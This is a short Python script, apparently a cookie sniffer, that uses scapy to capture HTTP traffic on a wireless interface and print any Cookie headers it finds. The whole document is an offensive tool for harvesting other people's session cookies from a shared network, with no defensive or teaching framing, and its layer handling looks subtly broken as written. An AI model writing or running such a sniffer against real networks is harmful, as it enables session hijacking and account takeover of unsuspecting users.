from scapy.all import *
import re

def process_packet(packet):
    if packet.haslayer(HTTP):
        http_packet = packet.getlayer(HTTP)
        if http_packet.haslayer(Raw):
            load = http_packet[Raw].load
            cookies = re.findall(r"Cookie: (.*?)\r\n", load.decode())
            if cookies:
                print("[+] Cookies found:")
                for cookie in cookies:
                    print(cookie)
                print("")

def sniff_packets(interface):
    sniff(iface=interface, prn=process_packet, store=False)

if __name__ == "__main__":
    interface = "wlan0"  # Replace with your network interface name
    sniff_packets(interface)
